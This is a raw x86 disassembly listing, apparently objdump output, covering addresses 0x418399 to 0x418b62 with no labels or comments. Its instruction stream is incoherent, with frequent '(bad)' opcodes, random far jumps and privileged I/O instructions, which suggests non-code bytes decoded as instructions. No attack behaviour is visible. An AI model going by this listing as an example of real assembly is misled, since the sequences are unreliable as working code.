  418399:	lods   eax,DWORD PTR ds:[esi]
  41839a:	jmp    0xa7a5617f
  41839f:	mov    ds:0xc0451d62,al
  4183a4:	jo     0x4183fb
  4183a6:	pop    esi
  4183a7:	or     cl,BYTE PTR [edx+0x14]
  4183aa:	jns    0x4183b1
  4183ac:	icebp  
  4183ad:	shl    DWORD PTR [esi+0x7],1
  4183b0:	shl    BYTE PTR [esi+0x5d],0x20
  4183b4:	imul   eax,edi,0x724c98a
  4183ba:	pushf  
  4183bb:	mov    bh,ch
  4183bd:	icebp  
  4183be:	cdq    
  4183bf:	enter  0xc3b6,0xf1
  4183c3:	movlps QWORD PTR [esi+0x4e009e2d],xmm5
  4183ca:	lods   eax,DWORD PTR ds:[esi]
  4183cb:	and    BYTE PTR [edx+0x60],al
  4183ce:	mov    esi,0x1e421762
  4183d3:	(bad)  
  4183d4:	mov    dl,0xb9
  4183d6:	hlt    
  4183d7:	push   ebp
  4183d8:	cmp    DWORD PTR [ebp+0x59],esp
  4183db:	jo     0x418391
  4183dd:	nop
  4183de:	les    ebx,FWORD PTR [eax]
  4183e0:	mov    ds:0xfa5da174,eax
  4183e5:	or     edi,DWORD PTR [edx-0x6f23fd62]
  4183eb:	shl    DWORD PTR [eax],0x52
  4183ee:	aad    0x85
  4183f0:	cmp    DWORD PTR [ebx+eiz*1-0x60b3217e],eax
  4183f7:	loopne 0x4183fc
  4183f9:	aaa    
  4183fa:	sbb    bh,0x58
  4183fd:	(bad)  
  4183fe:	fstp   TBYTE PTR ds:[ebx+0x73]
  418402:	cmp    DWORD PTR ds:0x8491232b,edi
  418408:	lea    esp,[esi]
  41840a:	outs   dx,BYTE PTR ds:[esi]
  41840b:	pop    ebx
  41840c:	scas   al,BYTE PTR es:[edi]
  41840d:	and    al,0x15
  41840f:	out    0x70,eax
  418411:	and    al,0x75
  418413:	imul   ebx,DWORD PTR [edx+0x50],0xd09ac744
  41841a:	mov    esi,0x2ca40468
  41841f:	out    dx,al
  418420:	scas   al,BYTE PTR es:[edi]
  418421:	mul    ecx
  418423:	test   bl,cl
  418425:	dec    esi
  418426:	fnsave [edi]
  418428:	jg     0x4183c9
  41842a:	(bad)  
  41842c:	jns    0x41843f
  41842e:	mov    WORD PTR [ecx],es
  418430:	or     al,0x4f
  418432:	mov    al,0x0
  418434:	rcr    BYTE PTR [ebx],0x74
  418437:	ds std 
  418439:	or     DWORD PTR [edi],ebx
  41843b:	into   
  41843c:	aad    0x61
  41843e:	stos   DWORD PTR es:[edi],eax
  41843f:	mov    ebp,0x512cb4a3
  418444:	jno    0x4183ea
  418446:	lods   eax,DWORD PTR ds:[esi]
  418447:	or     al,0x6c
  418449:	lock pop eax
  41844b:	ins    DWORD PTR es:[edi],dx
  41844c:	jecxz  0x4183fe
  41844e:	pop    es
  41844f:	loope  0x41849e
  418451:	mov    ds:0xc2d02e36,al
  418456:	mov    esp,0xfabd8f45
  41845b:	jl     0x41844a
  41845d:	cmp    al,0xda
  41845f:	inc    BYTE PTR [eax-0x4b]
  418462:	dec    esp
  418463:	mov    eax,edi
  418465:	in     eax,dx
  418466:	enter  0x4af9,0x7f
  41846a:	mov    ds:0x6618f671,eax
  41846f:	mov    esp,0xb6588797
  418474:	ins    BYTE PTR es:[edi],dx
  418475:	imul   edi,DWORD PTR [eax+0x7],0x6a
  418479:	adc    DWORD PTR [ecx+0x14],esp
  41847c:	mov    bh,0xa7
  41847e:	call   0xaef6:0xc46a457a
  418485:	test   al,0x1e
  418487:	leave  
  418488:	fidivr DWORD PTR [eax]
  41848a:	inc    ecx
  41848b:	and    eax,0x747c3210
  418490:	and    ebp,DWORD PTR [ecx+0x3eaef691]
  418496:	stos   BYTE PTR es:[edi],al
  418497:	retf   0x88cb
  41849a:	push   esp
  41849b:	arpl   WORD PTR [ecx],ax
  41849d:	popa   
  41849e:	mov    esp,0xbbca6094
  4184a3:	dec    ebp
  4184a4:	je     0x41845e
  4184a6:	pusha  
  4184a7:	retf   
  4184a8:	xchg   ebp,eax
  4184a9:	add    esi,DWORD PTR [si+0xe21]
  4184ae:	shl    cl,1
  4184b0:	xor    BYTE PTR [edi],cl
  4184b2:	int    0xb3
  4184b4:	mov    ds:0x3973d3c8,al
  4184b9:	cmp    edi,DWORD PTR [ecx+ecx*2-0x67]
  4184bd:	scas   eax,DWORD PTR es:[edi]
  4184be:	xchg   DWORD PTR ds:0x4990492a,esp
  4184c4:	jge    0x4184ba
  4184c6:	sub    DWORD PTR [ecx+0x25],ebx
  4184c9:	adc    eax,0xa654c5e3
  4184ce:	scas   eax,DWORD PTR es:[edi]
  4184cf:	stc    
  4184d0:	call   0x70563101
  4184d5:	outs   dx,DWORD PTR ds:[esi]
  4184d6:	popa   
  4184d7:	jg     0x41847a
  4184d9:	fsincos 
  4184db:	call   0x7c95:0x561ebcf6
  4184e2:	enter  0xd645,0x78
  4184e6:	fstp   QWORD PTR [ebp+0x76a64eda]
  4184ec:	mov    esi,0x172069e4
  4184f1:	inc    eax
  4184f2:	pusha  
  4184f3:	inc    esi
  4184f4:	lock rcr BYTE PTR ss:[edx+0x75],cl
  4184f9:	test   BYTE PTR [ebp+0x3007e9bb],ah
  4184ff:	mov    edx,DWORD PTR [edx+ebx*4-0x249c7913]
  418506:	pop    ds
  418507:	cs in  al,0x2a
  41850a:	div    edx
  41850c:	leave  
  41850d:	leave  
  41850e:	adc    al,0xce
  418510:	sub    DWORD PTR [eax],ebx
  418512:	scas   eax,DWORD PTR es:[edi]
  418513:	(bad)  
  418514:	jbe    0x418528
  418516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418517:	jne    0x4184ee
  418519:	pusha  
  41851a:	ret    
  41851b:	sub    ebx,DWORD PTR [esp+eiz*2-0xd]
  41851f:	adc    BYTE PTR [edx+0xc98ba75],dl
  418525:	dec    edi
  418526:	jp     0x4184cb
  418528:	and    bh,BYTE PTR [eax]
  41852a:	push   edi
  41852b:	ins    DWORD PTR es:[edi],dx
  41852c:	mov    ebx,0xb2b3af73
  418531:	add    al,0xa5
  418533:	jno    0x41851e
  418535:	and    dh,cl
  418537:	cmp    edx,ecx
  418539:	inc    ebx
  41853a:	ins    BYTE PTR es:[edi],dx
  41853b:	jno    0x41858b
  41853d:	jmp    0xa56f:0x9ee7b1eb
  418544:	mov    esi,fs
  418546:	(bad)
  418549:	xchg   edx,eax
  41854a:	sbb    bh,BYTE PTR [edx]
  41854c:	xchg   edx,eax
  41854d:	add    DWORD PTR [esi-0x7],ebx
  418550:	jg     0x4185af
  418552:	shr    DWORD PTR [edi+edi*1],1
  418555:	pop    ecx
  418556:	cmp    DWORD PTR [ebx+0x25aa152f],ecx
  41855c:	pop    ebp
  41855d:	adc    DWORD PTR [eax],0xbb59c386
  418563:	data16 jnp 0x418513
  418566:	xchg   esp,eax
  418567:	push   es
  418568:	retf   0xd1c3
  41856b:	int    0x3b
  41856d:	push   esi
  41856e:	sub    DWORD PTR [eax+ebx*1-0x77ceccf2],edi
  418575:	xchg   BYTE PTR [edx+0x31f87348],bh
  41857b:	ss or  eax,edi
  41857e:	pop    ds
  41857f:	xor    dh,0xe6
  418582:	lahf   
  418583:	adc    al,0xef
  418585:	test   DWORD PTR [edi+0xa9dd8a4],ebp
  41858b:	xor    al,BYTE PTR ds:0x560a8ea2
  418591:	(bad)  
  418592:	(bad)  
  418593:	push   edx
  418594:	fstp   DWORD PTR [esi-0x46]
  418597:	push   es
  418598:	cdq    
  418599:	ret    
  41859a:	xlat   BYTE PTR ds:[ebx]
  41859b:	or     DWORD PTR [edx+0x7a],ebp
  41859e:	or     bh,cl
  4185a0:	or     bh,BYTE PTR [esi-0x5]
  4185a3:	sub    ebx,0x72
  4185a6:	and    eax,DWORD PTR [eax-0x12]
  4185a9:	scas   eax,DWORD PTR es:[edi]
  4185aa:	mov    ds:0x5e7f441b,eax
  4185af:	lods   al,BYTE PTR ds:[esi]
  4185b0:	mov    edx,0xc50e4408
  4185b5:	xchg   ebx,eax
  4185b6:	mov    DWORD PTR [esi-0xde09c6b],eax
  4185bc:	clc    
  4185bd:	jbe    0x418629
  4185bf:	mov    cl,0xe1
  4185c1:	in     eax,dx
  4185c2:	aaa    
  4185c3:	push   0xffffff86
  4185c5:	xchg   BYTE PTR [eax+eiz*1+0x6],dl
  4185c9:	xor    DWORD PTR [ecx-0x8],edx
  4185cc:	jp     0x41861e
  4185ce:	sub    dl,BYTE PTR [ecx+0x7]
  4185d1:	dec    ebp
  4185d2:	aam    0xec
  4185d4:	push   esi
  4185d5:	mov    dh,0x50
  4185d7:	sbb    BYTE PTR [ecx],0x45
  4185da:	add    bh,dh
  4185dc:	lds    esp,FWORD PTR [eiz*8-0x193f6709]
  4185e3:	stos   BYTE PTR es:[edi],al
  4185e4:	imul   ebx,DWORD PTR [ebx-0x172dd2d8],0xe834a575
  4185ee:	adc    dl,BYTE PTR [esi+0x3e]
  4185f1:	mov    ds:0xc6890fee,eax
  4185f6:	aam    0x9
  4185f8:	dec    esp
  4185f9:	call   0x53d535c5
  4185fe:	push   edx
  4185ff:	dec    ebp
  418600:	mov    al,al
  418602:	mov    edx,0x43de88ac
  418607:	cli    
  418608:	cmp    ch,BYTE PTR [edx+0x6cf18540]
  41860e:	fisub  DWORD PTR [esi+eax*4-0x1ecd8f85]
  418615:	in     al,0xbc
  418617:	xor    BYTE PTR fs:0x717bde69,0xad
  41861f:	jne    0x418621
  418621:	sbb    BYTE PTR [ebx],cl
  418623:	add    ebp,edi
  418625:	sbb    DWORD PTR [edx+ebp*4-0x463ab116],ebp
  41862c:	push   ebx
  41862d:	into   
  41862e:	int3   
  41862f:	imul   esi,DWORD PTR [edi-0x4cee9c1e],0x6b67942f
  418639:	mov    WORD PTR [eax],ds
  41863b:	iret   
  41863c:	ins    BYTE PTR es:[edi],dx
  41863d:	mov    dl,0xae
  41863f:	repnz push ebp
  418641:	pop    ebp
  418642:	jecxz  0x418669
  418644:	int3   
  418645:	shl    BYTE PTR [eax+eiz*8-0x261749c9],1
  41864c:	push   esp
  41864d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41864e:	sbb    ebp,DWORD PTR [edi+0x265b6527]
  418654:	jnp    0x4186a2
  418656:	gs mov ebx,0xc07129bf
  41865c:	inc    edx
  41865d:	aas    
  41865e:	lods   al,BYTE PTR ds:[esi]
  41865f:	inc    ecx
  418660:	ret    0x7109
  418663:	mov    bh,0x76
  418665:	sbb    BYTE PTR [esi],dh
  418667:	nop
  418668:	and    DWORD PTR [edx+0x35],ecx
  41866b:	mov    dh,0xe0
  41866d:	iret   
  41866e:	mov    DWORD PTR [ebx+esi*4],esp
  418671:	stc    
  418672:	add    ebx,DWORD PTR [eax+0x79]
  418675:	and    eax,0x3cbd78b0
  41867a:	pop    edi
  41867b:	jnp    0x418657
  41867d:	mov    ah,0x6f
  41867f:	inc    ebp
  418680:	cmp    al,0x56
  418682:	fidiv  DWORD PTR [edi-0x6c]
  418685:	push   0xd1d1398f
  41868a:	aas    
  41868b:	or     esp,0xffffffc7
  41868e:	mov    bh,0x81
  418690:	xor    eax,0x2bb24745
  418695:	jmp    0xab37:0x433f9c72
  41869c:	mov    ah,0x1f
  41869e:	ret    
  41869f:	daa    
  4186a0:	sti    
  4186a1:	dec    esi
  4186a2:	icebp  
  4186a3:	(bad)  
  4186a4:	clc    
  4186a5:	inc    ebp
  4186a6:	dec    ebp
  4186a7:	sub    dl,BYTE PTR ds:0x3653c92d
  4186ad:	mov    ebx,0x384c0b27
  4186b2:	and    bl,BYTE PTR [edi]
  4186b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b5:	add    BYTE PTR [ebx],dl
  4186b7:	push   ebx
  4186b8:	das    
  4186b9:	cmp    edx,esi
  4186bb:	or     bl,bh
  4186bd:	shl    ecx,1
  4186bf:	mov    es,WORD PTR [eax]
  4186c1:	dec    edx
  4186c2:	mov    esp,0x147d2e76
  4186c7:	scas   eax,DWORD PTR es:[edi]
  4186c8:	shr    edi,0xb9
  4186cb:	adc    DWORD PTR [esi+0x406e3aed],esi
  4186d1:	sub    BYTE PTR [eax-0x358073fd],0xf
  4186d8:	sub    BYTE PTR [esi-0x5df29d67],al
  4186de:	hlt    
  4186df:	sub    edi,DWORD PTR [eax+0x5]
  4186e2:	adc    ebx,ecx
  4186e4:	dec    esp
  4186e5:	(bad)  [ebx]
  4186e7:	les    eax,FWORD PTR [ecx+0x621f70ef]
  4186ed:	loopne 0x418728
  4186ef:	ins    DWORD PTR es:[edi],dx
  4186f0:	fsub   DWORD PTR [esp+0x24]
  4186f4:	push   es
  4186f5:	inc    ecx
  4186f6:	or     DWORD PTR [edx],eax
  4186f8:	into   
  4186f9:	es jno 0x4186e0
  4186fc:	and    dl,BYTE PTR [edi-0x1e]
  4186ff:	imul   edx,DWORD PTR [ecx+0x48],0xaa8bc266
  418706:	outs   dx,DWORD PTR ds:[esi]
  418707:	jmp    0x78d4:0xe1844dba
  41870e:	sub    dh,BYTE PTR cs:[edi+0xf239622]
  418715:	enter  0x2cd1,0xb2
  418719:	addr16 mov esi,0xb7a28478
  41871f:	ret    
  418720:	pop    ecx
  418721:	mov    ds:0xb8686c90,al
  418726:	cmp    ebx,0xffffffa6
  418729:	inc    esi
  41872a:	cmc    
  41872b:	test   eax,0xb2c2eb90
  418730:	adc    edx,DWORD PTR [edi]
  418732:	imul   ebp,DWORD PTR [eax],0x6
  418735:	sahf   
  418736:	lods   eax,DWORD PTR ds:[esi]
  418737:	fs pop ss
  418739:	aas    
  41873a:	or     esp,ebp
  41873c:	mov    eax,ds:0xb15a652d
  418741:	call   0x4e4f:0xa09c13e4
  418748:	xchg   edi,eax
  418749:	mov    ds:0xb1a8524d,al
  41874e:	enter  0xb8f9,0x9c
  418752:	and    ch,bl
  418754:	idiv   ebp
  418756:	test   al,0xe5
  418758:	adc    eax,0xfc92fb00
  41875d:	sub    ebx,DWORD PTR [edx+0x55e610b5]
  418763:	pop    ss
  418764:	jl     0x418773
  418766:	stos   DWORD PTR es:[edi],eax
  418767:	pop    es
  418768:	dec    edx
  418769:	popf   
  41876a:	push   ds
  41876b:	into   
  41876c:	pop    edi
  41876d:	psubusb mm7,QWORD PTR [ebx-0x517a87d9]
  418774:	enter  0x309f,0x29
  418778:	icebp  
  418779:	retf   0x4aee
  41877c:	test   DWORD PTR [edx+0xb],ebx
  41877f:	fiadd  DWORD PTR [ebx+0x2b]
  418782:	test   al,0xad
  418784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418785:	(bad)  
  418786:	mov    cl,0x5d
  418788:	pop    ds
  418789:	adc    eax,0xd25b5894
  41878e:	push   ds
  41878f:	push   edx
  418790:	dec    esp
  418791:	push   edi
  418792:	or     ecx,esp
  418794:	ins    BYTE PTR es:[edi],dx
  418795:	or     eax,0x65cccef1
  41879a:	xchg   esi,eax
  41879b:	loop   0x418752
  41879d:	and    al,0x59
  41879f:	ins    DWORD PTR es:[edi],dx
  4187a0:	out    0xe1,al
  4187a2:	jo     0x4187ae
  4187a4:	inc    ecx
  4187a5:	nop
  4187a6:	ss inc ebx
  4187a8:	sbb    DWORD PTR [ebp-0x2],ebp
  4187ab:	sub    ah,BYTE PTR [edi]
  4187ad:	mov    edi,0x2ace4763
  4187b2:	fcom   QWORD PTR [eax+0x43f97b9a]
  4187b8:	dec    esp
  4187b9:	aas    
  4187ba:	call   0xceb740e9
  4187bf:	les    ebx,FWORD PTR [eax]
  4187c1:	outs   dx,DWORD PTR ds:[esi]
  4187c2:	ret    
  4187c3:	mov    WORD PTR [esi+0x78],gs
  4187c6:	ins    BYTE PTR es:[edi],dx
  4187c7:	push   0x9d7a2de3
  4187cc:	out    dx,eax
  4187cd:	(bad)  
  4187ce:	pop    ebx
  4187cf:	xor    edi,edx
  4187d1:	sub    BYTE PTR [ebx+eiz*4],ah
  4187d4:	fwait
  4187d5:	jmp    0xc3d0:0x8837771d
  4187dc:	push   ds
  4187dd:	mov    bh,0xd7
  4187df:	les    edi,FWORD PTR [eax+0x118ee1bd]
  4187e5:	shl    DWORD PTR ds:0xcae63df7,1
  4187eb:	push   ss
  4187ec:	fisubr WORD PTR [esi+0x52]
  4187ef:	dec    eax
  4187f0:	imul   ecx,edi,0x5d
  4187f3:	adc    al,0x53
  4187f5:	jmp    0x41877e
  4187f7:	test   eax,0xef7718bd
  4187fc:	sbb    DWORD PTR [ecx+0x30],esp
  4187ff:	xchg   edi,eax
  418800:	adc    al,0x32
  418802:	mov    ah,0xea
  418804:	(bad)  
  418805:	and    al,0xdd
  418807:	lea    eax,[esi+eax*8]
  41880a:	xchg   dx,ax
  41880c:	xor    eax,DWORD PTR [edi]
  41880e:	jo     0x41879d
  418810:	jb     0x418816
  418812:	test   DWORD PTR [edi-0x44],0xea3b52d9
  418819:	mov    esi,0xe7f05fd0
  41881e:	mov    ds:0xf4212c54,eax
  418823:	adc    dh,dl
  418825:	mov    eax,cs:0x34edc682
  41882b:	adc    DWORD PTR [ecx+ebx*4-0x1c],edx
  41882f:	xlat   BYTE PTR ds:[ebx]
  418830:	leave  
  418831:	mov    al,ds:0x5c7d3a69
  418836:	pusha  
  418837:	ins    DWORD PTR es:[edi],dx
  418838:	cmp    cl,0x7c
  41883b:	das    
  41883c:	jmp    0x41887e
  41883e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41883f:	sub    edx,ecx
  418841:	xchg   esi,eax
  418842:	inc    esp
  418843:	cs jb  0x4187db
  418846:	xchg   BYTE PTR ds:0xc64b3b88,al
  41884c:	std    
  41884d:	sub    al,dh
  41884f:	out    dx,al
  418850:	loop   0x4188a4
  418852:	aam    0x95
  418854:	repz jle 0x4187e9
  418857:	pop    edx
  418858:	into   
  418859:	jle    0x4188d2
  41885b:	in     eax,dx
  41885c:	add    eax,0xb377345
  418861:	ds jecxz 0x418882
  418864:	out    dx,al
  418865:	popa   
  418866:	hlt    
  418867:	sbb    BYTE PTR [esp+esi*4-0x72],0x2e
  41886c:	jge    0x4187fb
  41886e:	std    
  41886f:	jae    0x4188c2
  418871:	pop    ebx
  418872:	repz iret 
  418874:	mov    cl,0x85
  418876:	mov    cs,WORD PTR [ebp+eax*8+0x3d011e96]
  41887d:	push   esi
  41887e:	jp     0x418819
  418880:	les    ebp,FWORD PTR [eax-0x3]
  418883:	adc    eax,0x35abd5fc
  418888:	not    DWORD PTR [esi-0x5]
  41888b:	and    eax,ebp
  41888d:	dec    ecx
  41888e:	xlat   BYTE PTR ds:[ebx]
  41888f:	add    ebp,DWORD PTR [edx-0x76]
  418892:	cmc    
  418893:	inc    edi
  418894:	push   esi
  418895:	fmul   DWORD PTR [ebp-0x24b96c75]
  41889b:	lods   eax,DWORD PTR ds:[esi]
  41889c:	mov    ds:0x664e7306,al
  4188a1:	mov    al,ds:0x43577997
  4188a6:	inc    edx
  4188a7:	ficomp DWORD PTR [ecx]
  4188a9:	in     eax,dx
  4188aa:	mov    ebp,ebx
  4188ac:	dec    ecx
  4188ad:	pop    eax
  4188ae:	(bad)  
  4188af:	cmp    al,0xe9
  4188b1:	out    dx,al
  4188b2:	sbb    al,0x2e
  4188b4:	dec    ebp
  4188b5:	mov    es,edi
  4188b7:	ror    DWORD PTR [ebx+0x4d],1
  4188ba:	mov    ?,WORD PTR [esi+edx*1]
  4188bd:	sbb    eax,0x9eeeb415
  4188c2:	jge    0x41885d
  4188c4:	jmp    0x5abf634f
  4188c9:	pushf  
  4188ca:	and    BYTE PTR [ebx-0x4f],bh
  4188cd:	xchg   DWORD PTR [edi],ebx
  4188cf:	sar    DWORD PTR [edi],1
  4188d1:	inc    ecx
  4188d2:	je     0x41893a
  4188d4:	pop    esp
  4188d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188d6:	fcomp  QWORD PTR [ebx-0x5969f8ee]
  4188dc:	and    eax,ebp
  4188de:	nop
  4188df:	and    edx,DWORD PTR [ecx]
  4188e1:	dec    ebx
  4188e2:	dec    ecx
  4188e3:	(bad)  
  4188e4:	jmp    0x1ce5:0x685a2ec1
  4188eb:	xchg   esp,eax
  4188ec:	(bad)  [esi-0x76]
  4188ef:	pusha  
  4188f0:	imul   eax,DWORD PTR [esi+ebx*4],0x8abe21d6
  4188f7:	mov    edx,0x93cde129
  4188fc:	aad    0xd9
  4188fe:	mov    ch,0xe4
  418900:	pop    ecx
  418901:	xchg   ebp,eax
  418902:	(bad)  
  418903:	into   
  418904:	cwde   
  418905:	xor    eax,0x5e88da16
  41890a:	pop    edx
  41890b:	xor    ch,BYTE PTR [eax+0x364628f6]
  418911:	add    eax,0x865fabbd
  418916:	retfw  
  418918:	mov    ah,0x2f
  41891a:	mov    esp,0xf8e4560c
  41891f:	mov    DWORD PTR [edx],eax
  418921:	into   
  418922:	out    dx,eax
  418923:	test   BYTE PTR [edx],bh
  418925:	xchg   ebx,eax
  418926:	dec    eax
  418927:	add    esp,DWORD PTR [ebx+0x12890030]
  41892d:	repnz int 0x6c
  418930:	mov    eax,0xee7dbe86
  418935:	outs   dx,BYTE PTR ds:[esi]
  418936:	call   0xc4f54285
  41893b:	fs xchg ebx,eax
  41893d:	outs   dx,DWORD PTR ds:[esi]
  41893e:	add    esp,DWORD PTR [ebp+ebp*2+0x571cd9e1]
  418945:	int3   
  418946:	mov    dl,0x98
  418948:	cmp    esp,0xbafbbdfd
  41894e:	mov    al,BYTE PTR [ebx+0x17c4363d]
  418954:	inc    esp
  418955:	inc    ecx
  418956:	dec    ecx
  418957:	ficomp DWORD PTR [ecx]
  418959:	dec    edx
  41895a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895b:	or     BYTE PTR [edx-0x17],bh
  41895e:	or     al,al
  418960:	rcl    DWORD PTR [eax+0x4e8ace55],0xa4
  418967:	add    eax,0x446af4b6
  41896c:	cmp    eax,0x43ff362a
  418971:	imul   esi,DWORD PTR [eax+0x27ab6dea],0xff795e3e
  41897b:	jmp    0x72fb:0x235e99d0
  418982:	scas   eax,DWORD PTR es:[edi]
  418983:	imul   edx
  418985:	adc    DWORD PTR [eax],edi
  418987:	in     eax,dx
  418988:	xchg   esp,eax
  418989:	jl     0x41894b
  41898b:	pop    es
  41898c:	or     al,0x61
  41898e:	pop    ss
  41898f:	lds    ecx,FWORD PTR [edi+eiz*2]
  418992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418993:	sbb    DWORD PTR [ecx],esp
  418995:	cmp    dl,BYTE PTR [esi]
  418997:	int3   
  418998:	jo     0x418a17
  41899a:	xor    ecx,DWORD PTR [ebp+0x1c0f4184]
  4189a0:	(bad)  
  4189a1:	xor    al,0xa1
  4189a3:	adc    al,0x8a
  4189a5:	rol    eax,1
  4189a7:	leave  
  4189a8:	sub    eax,0x2797499
  4189ad:	inc    eax
  4189ae:	fwait
  4189af:	jb     0x418945
  4189b1:	push   ds
  4189b2:	jnp    0x41895e
  4189b4:	cmp    eax,0xea7dbd9
  4189b9:	call   0xbc4f:0xff1ccf0f
  4189c0:	dec    ebp
  4189c1:	sub    BYTE PTR [eax-0x7b7baf88],ch
  4189c7:	pop    ebx
  4189c8:	or     bh,bh
  4189ca:	fldcw  WORD PTR [ecx]
  4189cc:	sahf   
  4189cd:	jns    0x418a10
  4189cf:	adc    al,0x25
  4189d1:	xor    cl,ch
  4189d3:	sbb    eax,0xe357410d
  4189d8:	jmp    0x418a13
  4189da:	pusha  
  4189db:	test   DWORD PTR [ecx+0x37],esp
  4189de:	imul   edx,DWORD PTR [ecx+esi*2-0x679925da],0xe
  4189e6:	nop
  4189e7:	cmc    
  4189e8:	sahf   
  4189e9:	or     eax,0x90d215f8
  4189ee:	xor    DWORD PTR [ebx],ecx
  4189f0:	loope  0x418a51
  4189f2:	gs fs push es
  4189f5:	inc    edi
  4189f6:	mov    ebp,eax
  4189f8:	or     ch,BYTE PTR [edx]
  4189fa:	xor    BYTE PTR [edi-0x9996eb1],al
  418a00:	pop    ss
  418a01:	pop    ss
  418a02:	sar    DWORD PTR [eax],cl
  418a04:	loopne 0x4189be
  418a06:	sub    BYTE PTR [ecx-0x2f],0x5
  418a0a:	push   es
  418a0b:	inc    ebp
  418a0c:	neg    dh
  418a0e:	xor    dh,al
  418a10:	pop    esi
  418a11:	and    eax,0xa975d563
  418a16:	jmp    0xe14c74e5
  418a1b:	pop    ebx
  418a1c:	mov    BYTE PTR fs:[ecx-0x19a4a3e],cl
  418a23:	inc    eax
  418a24:	sub    al,0x10
  418a26:	xchg   edx,eax
  418a27:	dec    ebx
  418a28:	cmp    DWORD PTR [esi-0x7d],0xffffffd6
  418a2c:	out    dx,eax
  418a2d:	mov    esi,DWORD PTR [eax+ebx*4+0x5c62489f]
  418a34:	cwde   
  418a35:	shl    ebp,0xff
  418a38:	pop    ecx
  418a39:	add    edx,DWORD PTR [eax-0x20298b61]
  418a3f:	and    eax,0xb4b33cfa
  418a44:	sbb    edi,esp
  418a46:	pop    edx
  418a47:	xor    dh,bh
  418a49:	in     eax,0x5c
  418a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a4c:	test   DWORD PTR [ecx+0x7d7a7ac],ebp
  418a52:	clc    
  418a53:	ins    BYTE PTR es:[edi],dx
  418a54:	dec    esi
  418a55:	out    dx,eax
  418a56:	rol    esi,cl
  418a58:	(bad)  
  418a59:	hlt    
  418a5a:	mov    ch,0xea
  418a5c:	mov    eax,0x7b0fed4f
  418a61:	jne    0x4189f1
  418a63:	cwde   
  418a64:	cmp    BYTE PTR [edi+0x5],cl
  418a67:	iret   
  418a68:	sbb    eax,0xeecf34c6
  418a6d:	or     edx,esp
  418a6f:	add    eax,0xb5cc8d84
  418a74:	neg    BYTE PTR [edx-0x6]
  418a77:	add    BYTE PTR [ebx+edx*8-0x6fd08516],bl
  418a7e:	xchg   ebx,eax
  418a7f:	or     eax,0x5066041
  418a84:	pop    es
  418a85:	shl    BYTE PTR [esi-0xf],1
  418a88:	lock pop ds
  418a8a:	mov    bh,0x37
  418a8c:	scas   al,BYTE PTR es:[edi]
  418a8d:	loope  0x418aa1
  418a8f:	(bad)
  418a92:	(bad)  
  418a94:	adc    edi,DWORD PTR [edx-0x29]
  418a97:	inc    edx
  418a98:	arpl   WORD PTR [ebx-0x29],cx
  418a9b:	add    al,0xcc
  418a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a9e:	jnp    0x418aef
  418aa0:	pop    eax
  418aa1:	mov    ecx,0x31f0fce7
  418aa6:	jmp    0x418aca
  418aa8:	and    ebp,DWORD PTR [ebx+0x12]
  418aab:	inc    edi
  418aac:	and    bh,al
  418aae:	in     eax,dx
  418aaf:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418ab1:	push   es
  418ab2:	sbb    DWORD PTR [eax-0x137ed59b],0x5a
  418ab9:	test   bl,dh
  418abb:	inc    ebp
  418abc:	push   esp
  418abd:	mov    dh,0x55
  418abf:	sbb    al,0xf8
  418ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac2:	and    eax,0xb951a3f8
  418ac7:	jg     0x418b25
  418ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aca:	sbb    dh,BYTE PTR [esi+0x635240fc]
  418ad0:	sub    al,BYTE PTR [edx]
  418ad2:	pop    ds
  418ad3:	arpl   WORD PTR [eax-0x74],cx
  418ad6:	loop   0x418a86
  418ad8:	jle    0x418b1a
  418ada:	pcmpeqw mm2,QWORD PTR [eax+0x78]
  418ade:	fwait
  418adf:	pop    esi
  418ae0:	shl    DWORD PTR [edx+0xf0446d2],cl
  418ae6:	jae    0x418ab5
  418ae8:	or     bh,bh
  418aea:	in     eax,dx
  418aeb:	jno    0x418ab5
  418aed:	xor    al,0x83
  418aef:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  418af1:	and    al,0x5e
  418af3:	bound  ebp,QWORD PTR [esi+0x33]
  418af6:	mov    edi,0x61ba1950
  418afb:	dec    ecx
  418afc:	test   al,0x29
  418afe:	popa   
  418aff:	jp     0x418ab9
  418b01:	sub    DWORD PTR [ebp+0x68],0x53252a16
  418b08:	pop    esp
  418b09:	out    0x24,eax
  418b0b:	sti    
  418b0c:	ficom  WORD PTR [ecx+ecx*2-0x7a]
  418b10:	push   0xfffffff0
  418b12:	push   esp
  418b13:	inc    eax
  418b14:	imul   ebp,DWORD PTR [eax+0x5e],0xffffff96
  418b18:	inc    ecx
  418b19:	push   edi
  418b1a:	dec    edi
  418b1b:	rol    DWORD PTR [edi+0x1a],cl
  418b1e:	das    
  418b1f:	and    DWORD PTR [eax],0x1a8bf9e4
  418b25:	inc    edx
  418b26:	push   ecx
  418b27:	addr16 in al,0x3
  418b2a:	inc    ecx
  418b2b:	mov    eax,ds:0x41676cfb
  418b30:	mov    cl,0x5e
  418b32:	pop    ss
  418b33:	or     DWORD PTR gs:[ebx-0x50],edi
  418b37:	fistp  WORD PTR [edx+0x2edfd941]
  418b3d:	stos   DWORD PTR es:[edi],eax
  418b3e:	adc    cl,al
  418b40:	push   ebx
  418b41:	cmp    BYTE PTR ds:0x2f6003dc,ah
  418b47:	fisubr WORD PTR [ebx+edx*8+0x74]
  418b4b:	mov    dh,0x59
  418b4d:	retf   0x7a2b
  418b50:	cli    
  418b51:	lods   eax,DWORD PTR ds:[esi]
  418b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b53:	push   esi
  418b54:	sbb    eax,edx
  418b56:	adc    esi,DWORD PTR [ecx-0x79d0aacc]
  418b5c:	pop    ebx
  418b5d:	sahf   
  418b5e:	dec    eax
  418b5f:	adc    al,0x94
  418b61:	clc    
  418b62:	test   BYTE PTR [eax],bh
